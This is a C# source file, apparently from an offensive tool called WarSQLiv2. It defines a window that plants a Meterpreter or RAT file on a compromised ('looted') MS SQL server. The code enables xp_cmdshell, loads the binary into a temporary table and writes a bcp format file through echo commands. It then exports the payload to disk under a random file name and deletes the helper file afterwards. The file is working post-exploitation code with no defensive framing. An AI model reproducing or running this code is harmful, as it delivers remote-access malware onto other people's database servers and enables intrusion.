using System;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmSendFileToMsSqlServer.xaml
    /// </summary>
    public partial class FrmSendFileToMsSqlServer : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        private readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmSendFileToMsSqlServer()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    btnSelectFile.Content = _languageControl.SelectedLanguage.GetString("ButtonSelectFile");
                    btnUpload.Content = _languageControl.SelectedLanguage.GetString("ButtonUpload");
                    lblDetails.Content = _languageControl.SelectedLanguage.GetString("LabelDetails");
                    lblLooted.Content = _languageControl.SelectedLanguage.GetString("GroupBoxLooted");
                    Title = _languageControl.SelectedLanguage.GetString("TitleSendFileToMsSqlServer");
                    btnUpload.IsEnabled = false;
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void btnSelectFile_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                Dispatcher.Invoke((Action)delegate
                {
                    try
                    {
                        var file = new System.Windows.Forms.OpenFileDialog
                        {
                            InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                            Title = @"Please Select Meterpreter or RAT File"
                        };
                        var sdg = file.ShowDialog();
                        if (sdg == System.Windows.Forms.DialogResult.OK)
                        {
                            txtSelectFile.Text = file.FileName;
                        }
                        btnUpload.IsEnabled = true;

                    }
                    catch (Exception exp)
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    }
                });
            }            
        }
        private void btnUpload_Click(object sender, RoutedEventArgs e)
        {
            var rnd = new Random();
            var chr = "0123456789ABCDEFGHIJKLMNOPRSTUVWXYZ".ToCharArray();
            var randomFileName = string.Empty;
            for (var i = 0; i < 12; i++)
            {
                randomFileName += chr[rnd.Next(0, chr.Length - 1)].ToString();
            }
            var path = txtSelectFile.Text.Split('.');
            var pathCount = (path.Count() - 1);
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action) delegate
                {
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.CreateBinaryTable();
                    txtStatus.AppendText(_postExploitation.ExploitResult);
                    
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.BinaryData = File.ReadAllBytes(txtSelectFile.Text);
                    _postExploitation.InsertBinaryData();
                    txtStatus.AppendText(_postExploitation.ExploitResult);


                    _postExploitation.ExploitCode = string.Empty;
                    _postExploitation.ExploitCode += "EXECUTE master..xp_fileexist '" + txtPath.Text + "\\bcpCommand.txt'";
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.RunExploit();
                    var fileExists2 = _postExploitation.ExploitResult.Replace("\r\n", "");
                    if (fileExists2 == "1")
                    {
                        txtStatus.AppendText(Environment.NewLine + "File Exists: " + txtPath.Text + "\\bcpCommand.txt'");
                        _postExploitation.ExploitCode = string.Empty;
                        _postExploitation.ExploitCode += "EXECUTE xp_cmdshell 'del " + txtPath.Text + "\\bcpCommand.txt'";
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.RunExploit();
                        txtStatus.AppendText(_postExploitation.ExploitResult);
                    }

                    _postExploitation.ExploitCode = string.Empty;
                    const string bcpCommand = "8.0|1|1 SQLIMAGE 0 0 \"\" 1 binaryTable \"\"";

                    var bcpCmd = bcpCommand.Split('|');
                    foreach (var echoCommand in bcpCmd)
                    {
                        _postExploitation.ExploitCode = "EXEC master..xp_cmdshell 'echo " + echoCommand + " >> " + txtPath.Text + "\\bcpCommand.txt'";
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.RunExploit();
                    }

                    _postExploitation.ExploitCode = string.Empty;
                    _postExploitation.ExploitCode =
                        "EXEC xp_cmdshell 'bcp \"select binaryTable from WarSQLiTemp\" queryout \"" + txtPath.Text +
                        "\\" + randomFileName + "." + path[pathCount] + "\" -T -f " + txtPath.Text + "\\bcpCommand.txt" +
                        "'";
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.RunExploit();
                    txtStatus.AppendText(_postExploitation.ExploitResult);

                    _postExploitation.ExploitCode = string.Empty;
                    _postExploitation.ExploitCode += "EXECUTE master..xp_fileexist '" + txtPath.Text + "\\" + randomFileName + "." + path[pathCount] + "'";

                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.RunExploit();
                    var fileSave = _postExploitation.ExploitResult.Replace("\r\n", "");
                    if (fileSave == "1")
                    {
                        txtStatus.AppendText("File Saved: " + txtPath.Text + "\\" + randomFileName + "." + path[pathCount]);
                    }
                    else
                    {
                        txtStatus.AppendText("File cannot be saved!");
                    }

                    _postExploitation.ExploitCode = string.Empty;
                    _postExploitation.ExploitCode += "EXECUTE master..xp_fileexist '" + txtPath.Text + "\\bcpCommand.txt'";
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    _postExploitation.RunExploit();
                    var fileExists3 = _postExploitation.ExploitResult.Replace("\r\n", "");
                    if (fileExists3 == "1")
                    {
                        txtStatus.AppendText(Environment.NewLine + "File Exists: " + txtPath.Text + "\\bcpCommand.txt'");
                        _postExploitation.ExploitCode = string.Empty;
                        _postExploitation.ExploitCode += "EXECUTE xp_cmdshell 'del " + txtPath.Text + "\\bcpCommand.txt'";
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.RunExploit();
                        txtStatus.AppendText(_postExploitation.ExploitResult);
                    }
                    else
                    {
                        txtStatus.AppendText("File cannot be deleted!");
                    }

                });
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
        }
    }
}
